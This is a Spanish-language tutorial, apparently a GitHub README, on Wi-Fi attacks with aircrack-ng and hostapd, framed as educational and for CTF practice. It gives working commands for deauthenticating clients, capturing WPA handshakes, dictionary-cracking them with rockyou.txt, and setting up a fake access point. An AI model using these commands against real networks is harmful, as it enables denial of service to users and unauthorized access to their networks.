# Get off my wifi

Esta es la colección de notas sobre ataques WIFI con la que me hubiera gustado encontrarme hace algunos años. Entre otras cosas, esta guía permitirá:

+ Banear a los usuarios no autorizados de tu red WIFI.
+ Ataques de diccionario a una red WIFI con aircrack-ng
	+ Ataque a Router
	+ Ataque a cliente a través de un Fake Access Point
+ Resolver los retos WIFI planteados en ctf.live

**Advertencia:** Este material es meramente educativo. Y claro, debe probarse únicamente con redes que nos pertenecen.

Si usted se encuentra en un ambiente gráfico es posible que pueda correr programas en paralelo desde diversos terminales. Sin embargo, si únicamente tiene una shell disponible tendrá que mirar el **Anexo 1: Comando jobs**

# Comandos aircrack-ng
El siguiente contenido está dividido en tres partes y nos permitirán realizar lo siguiente:
+ Deautenticar (Desconectar) a usuarios de la red WIFI
	+ Pasos 1-4, 6
+ Generar un ataque de diccionario para obtener la contraseña WIFI
	+ Pasos 1-7
+ Salir del modo monitor
	+ Paso 8

## 1) Mostrar las intefaces de red
Para interactuar con cualquier red WIFI es necesario tener una interfaz WIFI. (Esta necesariamente debe tener disponible el modo monitor). En Linux, contamos con diversos comandos para trabajar con nuestra interfaz de red. 

1.- A través de airmon 
```
sudo airmon-ng
```

2.- A través de iwconfig
```
iwconfig
```

Cualquiera de las dos nos mostrará información sobre nuestras interfaces de red. La primera columna corresponderá al nombre de interfaz y la usaremos más tarde. Para este ejemplo `wlan0`

## 2) Deshabilitar cualquier proceso que pueda interferir con la captura de paquetes
En ocasiones es posible que algún proceso esté utilizando nuestra interfaz de red y eso impida habilitar el modo monitor. Para evitar eso utilizamos:

```
sudo airmon-ng check kill
```

## 3) Habilitar el modo monitor de nuestra tarjeta de red
El modo monitor/promiscuo es un modo en que nuestra interfaz podrá escuchar el tráfico de red. Nuevamente, tenemos diversas formas de activar este modo.

Opción airmon-ng
```
sudo airmon-ng start <interfaz>
```
* En nuestro caso la interfaz es `wlan0` 

Opción iw
```
iw dev <interfaz> set monitor none
```

Opción ifconfig
```
ifconfig <interfaz> down
iw dev <interfaz> set monitor none
ifconfig <interfaz> up
```

Opción ifconfig 2
```
ifconfig <interfaz> down
iwconfig <interfaz>  mode monitor
ifconfig <interfaz>  up
```

Si volvemos a correr el paso uno podremos ver que nuestra interfaz de red ahora se encuentra en modo monitor bajo el nombre de `wlan0mon` ó `wlan0`. Lo anterior depende del modo en que se habilitó. 
* Es necesario corroborar el nombre de nuestra interfaz para trabajar con ella más tarde.

## 4) Listar las redes y clientes que existen a nuestro alrederor
Ahora, con ayuda de `airdump-ng` nosotros podremos observar las redes WIFI y clientes conectados a nuestro alrededor.

```
sudo airodump-ng <interfaz>
```
* En nuestro caso `<interfaz>` es `wlan0`
* ¿Qué significa la información que nos arroja? Ver **"Anexo 2: Listado de redes**"

Aquí es **importante** ubicar a nuestro objetivo a través de su **bssid** dependiendo de lo que queramos hacer:
+ Crackear la contraseña de una red WIFI 
+ Sacar a uno o a todos los clientes WIFI de una red.

Una vez obtenida la información paramos la ejecución con ``CTRL+C``

## 5) Capturamos el tráfico de la red
En el caso de que queramos obtener la contraseña de una red WIFI necesitaremos capturar el **handshake** intercambiado durante el establecimiento de la conexión entre el cliente y el router. Para esto, escucharemos todas las peticiones únicamente de nuestro objetivo (El router) y guardaremos en un archivo todo el tráfico intercambiado.

Este proceso debe ejecutarse hasta obtener el handshake (Forzamos esto en el paso 6). Tenemos dos opciones:
1. Dejar esto corriendo y abrir una nueva terminal para seguir con el tutorial
2. Correr esta tarea en segundo plano. (Anexo 1). 

Opción 1
```
sudo airodump-ng -c 1 --bssid 36:0A:98:80:97:C3 --write nombre_de_archivo <interfaz>
```
Opción 2
```
sudo airodump-ng -c 1 --bssid 36:0A:98:80:97:C3 --write nombre_de_archivo <interfaz> &
```
+ **-c** canal. En nuestro caso 1
+ **--bssid** bssid. En nuestro caso 36:0A:98:80:97:C3
+ **--write** nombre_de_archivo que guardará lo que capturamos
+ **interfaz** En nuestro caso wlan0

¿Qué es el **handshake**? ¿Acaso se envía la contraseña en texto claro? Ver **Anexo 3: Caputra del tráfico de red**

## 6) Ataque deauth

Deauthentication Attack es un ataque que nos permite expulsar a todos o a un solo cliente de la red WIFI.
Esto puede tener como objetivo:
+ Denegar el servicio a un solo cliente o a toda la red WIFI
+ Capturar el handshake que estamos buscando en el paso 5, para posteriormente hacer una ataque de fuerza bruta en busca de la clave.

#### Deautenticar a todos los clientes de un WIFI

```
sudo aireplay-ng -0 10 -a 36:0A:98:80:97:C3 <interfaz>
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados. Si seleccionas "0" lo hará de forma infinita.
+ **-a** Es la dirección MAC de la red WiFi objetivo
+ **Interfaz** En nuestro caso wlan0

#### Deautenticación a solamente un cliente de un WIFI

```
sudo aireplay-ng -0 10 -a 36:00:98:00:97:C3 -c 00:0A:FF:5F:FF:00 <interfaz>
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados. Si seleccionas "0" lo hará de forma infinita.
+ **-a** Es la dirección MAC de la red WiFi objetivo
+ **-c** Mac Address del cliente a deautenticar
+ **Interfaz** En nuestro caso wlan0

Después de lanzar el ataque deauth y conseguir el HANDSHAKE WPA, pulse `CTRL+C`. Para dejar de mandar el ataque Deauth. También finalice la captura de paquetes del paso 5.
+ Sí, solamente es `CTRL+C`
+ O en caso de haber utilizado tareas en segundo plano ver el Anexo 1

## 7) Ataque de diccionario para averiguar el password WIFI
Una vez que hemos obtenido nuestro handshake es tiempo de realizar un ataque de diccionario contra nuestro objetivo. 

```
sudo aircrack-ng nombre_archivo_captura.cap -w rockyou.txt
```
+ **nombre_archivo_captura.cap** es el que definimos en nuestro paso número 5.
+ **-w** Indica que se hará fuerza bruta a través de un diccionario, en nuestro caso utlizamos el diccionario `rockyou.txt`

Notas:
+ Si nos dice que no se encuentra el archivo *.cap hay que corroborar la ubicación y nombre de nuestro archivo
+ Si nos dice que no se ha encontrado un handshake es posible que no se haya capturado alguno. Recuerde que:
	+ Debe forzar la autenticación del cliente para lograr capturar el handshake
	+ Puede volver a probar a partir del paso número 4 para tratar de solucionar el error
+ Para obtener más información acerca de los diccionarios vea el **Anexo 4: Ataque de diccionario para averiguar el password WIFI**

## 8) Quitar el modo monitor y volver a utilizar nuestro WIFI
Una vez que hemos realizado nuestras labores querremos volver a utilizar nuestro WIFI de la forma habitual. Para esto tenemos las siguientes opciones.

Opción 1
1. Detenemos el modo monitor
2. Levantamos nuestra interfaz
3. Inciamos el servicio de red

```
sudo airmon-ng stop <interfaz>
sudo ifconfig wlan0 up
sudo systemctl start NetworkManager
```

Opción 2
```
ifconfig <interfaz> down
iwconfig <interfaz> mode managed
ifconfig <interfaz> up
```

# Creación de un Fake Access Point

En ciertas ocasiones (Retos CTF principalmente) es posible que nos pidan encontrar el password de una red WIFI a partir de un cliente que está buscando un punto de acceso. 

El escenario es el siguiente:
+ Al momento de listar las redes de nuestro alrededor (Paso 4), nos aparece un cliente que emite un PROBE con un nombre_de_red_wifi. El paquete PROBE básicamente es el cliente diciendo, "Hey, ¿Acaso está esta red WIFI por aquí?
+ Al notar esto nosotros podemos hacer un access point falso con ayuda de **hostapd** para que el cliente diga. ¡Oh, nombre_de_red_wifi, te he estado buscando! Mira, aquí te va mi Handshake
+ Por supuesto, como nuestro fake Access Point no será el mismo que el que el cliente tiene registrado esté se mantendrá mandando el handshake. 
+ Entonces nosotros capturamos el tráfico de nuestro falso AP (Access Point) y posteriormente realizamos fuerza bruta al handshake capturado.
+ Requerimos dos tarjetas de red
	+ 1 para realizar la captura de tráfico
	+ 1 Para montar el Fake AP

¿Cómo hacerlo?

## A) Obtenemos nuestro cliente en busca de cierto WIFI
Seguimos los pasos 1-4 de la sección **Comandos aircrack-ng**

## B) Montamos nuestro fake AP
1. Instalamos hostapd
```
sudo apt install hostapd
```
2. Seguimos los pasos 1-3 de la sección **Comandos aircrack-ng**
3. Creamos un archivo de configuración para hostapd
```
vim hostapd.conf
```

Ingresamos el siguiente contenido

```
interface=wlan0
driver=nl80211
ssid=YeahHub
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=yeahhub123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```

Significado:
+ interface = Wireless interface to host access point on i.e. wlan0.
+ driver = nl80211 is the new 802.11 netlink interface public header which is now replaced by cfg80211.
+ ssid = Name of the wireless network
+ hw_mode = Sets the operating mode of the interface and the allowed channels. (Generally uses a, b and g)
+ channel = Sets the channel for hostapd to operate on. (From 1 to 13)
+ macaddr_acl = Used for Mac Filtering (0 – disable, 1 – enable)
+ ignore_broadcast_ssid = Used to create hidden AP
+ auth_algs = Defines Authentication Algorithm (0 – for open, 1 – for shared)
+ wpa_passphrase = Contains your wireless password

Para nosotros bastará con cambiar la línea de ssid con el nombre que necesitemos

## C) Lanzamos nuestro fake AP
``` 
hostapd hostapd.conf
```
+ Donde `hostapd.conf` es el archivo que acabamos de crear
+ Si realizamos los pasos 1-4 de **Comandos aircrack-ng** debemos poder observar nuestra red fake

## D) Obtenemos nuestra contraseña 
Una vez hecho esto únicamente resta hacer los pasos 1-7 de **Comandos aircrack-ng** y con suerte obtendremos nuestra contraseña


# Anexo 1: Comando jobs
Algunos comandos bloquean la terminal ya que es usada como la salida estándar. Cuando trabajamos en una sola terminal esto puede ser engorroso. Para solucionar esto podemos hacer uso de los procesos en segunda plano que Linux nos brinda. Aquí mostraremos los comandos básicos, para información complementaria por favor vea la sección de **Información complementaria**

## Correra algo en segundo plano
Bastará con añadir un `&` luego del comando ejecutado.

```
ping google.com &
```
Sin embargo, el comando anterior seguirá utilizando nuestra terminal como salida estándar, haciendo que toda la salida de nuestro comando ejecutado vaya a nuestra pantalla principal.

Para solucionarlo podemos redireccionar la salida estándar a un archivo


```
ping google.com > salida.out &
```
+ Lo anterior hace la redirección de salida estándar

```
ping google.com > salida.out 2>&1 &
```
+ Lo anterior hace la redirección de salida estándar & error output

## Recuperar un proceso en segundo plano
Primero usamos `jobs` para saber el número de proceso

```
jobs
```
+ Esto nos devolverá el identificador del proceso con el título

Posteriormente `fg %NUMBER` donde NUMBER es el número del proceso que obtuvimos de `jobs`
```
fg %1
```

## Volver a enviar un proceso a segundo plano
Primero requieres devolverlo a segundo plano. Esto se logra con `Ctrl+Z`

Sin embargo al utilizar el atajo de teclado el proceso se detiene. Para reactivarlo solamente se utiliza `bg %NUMBER` y el proceso que se pondrá en marcha de nuevo. Donde NUMBER es el número que obtuvimos de el comando `jobs`

```
bg %1
```

## Para finalizar un proceso en segundo plano
Usamos `jobs` para ubicar nuestro proceso

```
jobs
```
Usamos `kill %NUMBER` donde NUMBER es el número de nuestro proceso

```
kill %1
```

## Conclusión
+ `jobs` para conocer los procesos en segundo plano
+ `fg` te permite traer el proceso a primer plano
+ `bg` puedes enviar el proceso a segundo plano
+ `kill` para matar un proceso en segundo plano


# Anexo 2: Listado de redes

+ **BSSID:** Mac Address de nuestro router (punto de acceso)
+ **PWR:** Nivel de señal 
+ **Beacons:** Número de “paquetes anucio” o beacons enviadas por el AP. 
	+ Cada punto de acceso envia alrededor de diez beacons por segundo cuando el rate o velocidad es de 1M, (la más baja) de tal forma que se pueden recibir desde muy lejos.
+ **#Data:** Número de paquetes de datos capturados.
	+ (si tiene clave WEP, equivale tambien al número de IVs), incluyendo paquetes de datos broadcast (dirigidos a todos los clientes).
+ **#/s:** Número de paquetes de datos capturados por segundo calculando la media de los últimos 10 segundos.
+ **CH:** Canal
+ **MB:** Velocidad máxima soportada por el AP. 
	+ Si MB = 11, es 802.11b, 
	+ Si MB = 22es 802.11b+ 
	+ Y velocidades mayores son 802.11g. 
	+ El punto (despues del 54) indica que esa red soporta un preámbulo corto o “short preamble”.
+ **ENC:** Algoritmo de encriptación que se usa. 
	+ OPN = no existe encriptación (abierta)
	+ “WEP?” = WEP u otra (no se han capturado suficientes paquetes de datos para saber si es WEP o WPA/WPA2) 
	+ WEP (sin el interrogante) indica WEP estática o dinámica
	+ WPA o WPA2 en el caso de que se use TKIP o CCMP.
+ **CIPHER:** Detector cipher. Puede ser CCMP, WRAP, TKIP, WEP, WEP40, o WEP104.
+ **AUTH:** El protocolo de autenticación usado. Puede ser: 
	+ MGT
	+ PSK (clave precompartida)
	+ OPN (abierta).
+ **ESSID**	Tambien llamado “SSID”
	+ Puede estar en blanco si la ocultación del SSID está activada en el AP. 
	+ En este caso, airodump-ng intentará averiguar el SSID analizando paquetes “probe responses” y “association requests” (son paquetes enviados desde un cliente al AP).

Justo debajo

+ **STATION:** Dirección MAC de cada cliente asociado. 
+ **Lost:** El número de paquetes perdidos en los últimos 10 segundos.
+ **Frames:** El número de paquetes de datos enviados por el cliente.
+ **Probes:** Los ESSIDs a los cuales ha intentado conectarse el cliente.	

# Anexo 3: Captura del tráfico de red
¿Qué es el **handshake**? ¿Acaso se envía la contraseña en texto claro?

Las contraseñas WIFI jamás son enviadas en texto plano. En su lugar llevan a cabo un intercambio denominado **handshake**. Cuya idea es algo parecido a la llave pública y llave privada. Intercambian un mensaje cifrado y si son capaces de descifrarlo entonces se da por hecho que conocen la contraseña.

Es por esa razón que un atacante no podría simplemente montar un fake AP e interceptar la contraseña que el cliente le manda. 

Sin embargo, es posible interceptar este **handshake** para posteriormente realizarle una ataque de diccionario.

# Anexo 4: Ataque de diccionario para averiguar el password WIFI

## ¿Qué es el ataque de diccionario?
Una vez obtenido el **handshake** es posible realizar una ataque de diccionario para tratar de crackear la contraseña WIFI. Ahora, un diccionario no es más que un archivo donde cada salto de línea representa una contraseña a probar. 

Luce algo así
```
password1
password2
superpassword
iloveyou
jajajanose
passwordn
```

Y lo que hace aircrack es tratar de de hacer que los valores criptograficos coincidan entre el password probado y el **handshake** obtenido. Esto se hace en modo off-line.

Una vez encontrado el resultado correcto aircrack nos mostrará nuestra contraseña.

## Inconvenientes de un ataque de diccionario
El problema con los ataques de diccionario es que si la contraseña no se encuentra dentro de este diccionario simplemente no aparecerá por arte de magia. Sin embargo, como ventaja, muchas personas utilizan contraseñas comunes y por eso los ataques de diccionario son altamente efectivos.

**¿Podría generar un diccionario con todas las posibles combinaciones?**
> "Well yes, but actually no"

Aunque teóricamente es posible, computacionalmente no lo es. Pues esto se debe a algo llamado **Permutación y Combinatoria**. Sucede algo parecido a:
+ Una contraseña depende de su alfabeto (Carácteres que compondrán la contraseña)
+ Longitud (El largo que tendrá la contraseña)
+ Una computadora pasaría meses e incluso años tratando de resolver cada una de las posibilidades que impongan las dos condiciones anteriores.

## ¿En dónde puedo conseguir uno de esos diccionarios?
+ Algunas distribuciones como Kali Linux incluyen algunos diccionarios de prueba
+ Puedes buscarlo en internet
+ Puedes realizar uno tu mismo con ayuda de un software (En algún momento publicaré el propio)

### Links de diccionarios. No están probados. Entra bajo tu propio riesgo.
https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
https://hackxcrack.net/foro/criptografia-y-esteneografia/diccionarios-para-brute-force/


# Información complementaria
+ <a href="https://medium.com/@Packt_Pub/the-deauthentication-attack-7872c916ed2a" target="_blank">the-deauthentication-attack</a>
+ <a href="https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142" target="_blank">Forcing a device to disconnect from WiFi using a deauthentication attack</a>
+ <a href="https://www.aircrack-ng.org/doku.php?id=deauthentication" target="_blank">Aircrack Deauthentication</a>
+ <a href="https://github.com/spacehuhn/esp8266_deauther" target="_blank">esp8266_deauther</a>
+ <a href="https://www.atareao.es/como/procesos-en-segundo-plano-en-linux/" target="_blank">PROCESOS EN SEGUNDO PLANO EN LINUX</a>
+ <a href="https://www.yeahhub.com/create-fake-ap-dnsmasq-hostapd-kali-linux/" target="_blank">Creando un Fake Access Point con hostapd</a>